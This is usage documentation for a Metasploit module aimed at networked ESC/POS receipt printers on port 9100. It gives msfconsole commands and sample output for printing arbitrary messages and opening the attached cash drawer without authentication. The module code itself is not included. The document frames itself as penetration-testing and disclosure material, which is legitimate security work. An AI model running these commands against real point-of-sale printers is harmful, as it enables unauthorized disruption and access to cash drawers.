# ESC/POS TCP Command Injector

## Overview

This Metasploit auxiliary module exploits an unauthenticated command injection vulnerability in networked Epson-compatible receipt printers. By sending crafted ESC/POS commands over TCP (typically port 9100), the module allows an attacker to print arbitrary messages and optionally trigger the attached cash drawer.

**Note:** This vulnerability affects any printer supporting the ESC/POS command set over TCP, commonly found in point-of-sale environments.

---

## Vulnerable Target

- **Printer Model:** Any Epson-compatible printer exposing the ESC/POS command set on TCP port 9100.
- **Protocol:** ESC/POS over TCP.
- **CVE:** Submitted for Epson-compatible thermal printers; awaiting assignment.

---

## Module Options

| Option            | Description                                                                                   | Default   |
|-------------------|-----------------------------------------------------------------------------------------------|-----------|
| RHOST             | Target IP address of the printer                                                              | (none)    |
| RPORT             | Target TCP port (typically 9100)                                                              | 9100      |
| MESSAGE           | Custom message to print. If empty, defaults to "PWNED"                                        | PWNED     |
| RUN_EXPLOIT       | Actually execute the exploit                                                         | true      |
| TRIGGER_DRAWER    | Trigger the attached cash drawer after printing                                      | false     |

---

## Usage Instructions

1. **Load the module:**

   ```
   use auxiliary/scanner/printer/escpos_tcp_command_injector
   ```

2. **Set required options:**

   ```
   set RHOST <printer_ip>
   set MESSAGE "Test message"
   # Optional: set TRIGGER_DRAWER true
   ```

3. **Execute the module:**

   ```
   run
   ```

---

## Example Usage

### Print a Custom Message

```
msf6 > use auxiliary/scanner/printer/escpos_tcp_command_injector
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set RHOST 192.168.1.200
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set MESSAGE "Hello from Metasploit"
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > run
```

### Trigger the Cash Drawer

```
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > set TRIGGER_DRAWER true
msf6 auxiliary(scanner/printer/escpos_tcp_command_injector) > run
```

---

## Sample Output

```
[*] Connecting to 192.168.1.200:9100...
[*] Sending ESC/POS command sequence...
[+] Message printed: "Hello from Metasploit"
[*] Cash drawer trigger: Success
[*] Module execution complete.
```

---

## Exploit Details

1. **Initialization:** Sends initialization and formatting commands to the printer.
2. **Custom Message:** Prints the provided message, typically centered and in large font.
3. **Cash Drawer Trigger:** Optionally sends the command to open the attached cash drawer.

---

## Potential Use Cases

- **Security Research:** Demonstrate vulnerabilities in legacy or misconfigured networked receipt printers.
- **Penetration Testing:** Test physical security controls at retail or hospitality locations.
- **Network Forensics:** Analyze printer traffic for compromise or misconfiguration.

---

## Compatibility

This module is compatible with most Epson-compatible receipt printers that expose the ESC/POS protocol on TCP port 9100.

---

## Ethical Warning

**This module is intended for lawful use in authorized testing environments only. Unauthorized use against devices you do not own or have explicit permission to test is illegal and unethical.**

---

## References

- [Epson ESC/POS Command Reference](https://download4.epson.biz/sec_pubs/pos/reference_en/escpos/index.html)
- [Metasploit Documentation: Writing Module Docs](https://github.com/rapid7/metasploit-framework/wiki/Writing-Module-Documentation)
- [Security Advisory](https://github.com/futileskills/Security-Advisory)
- CVE (pending)

---

## Author

- FutileSkills

---

## Verification

This module has been tested against a physical Epson-compatible receipt printer and verified to print custom messages and trigger the cash drawer. For additional device compatibility, refer to the ESC/POS protocol documentation or contact the vendor.
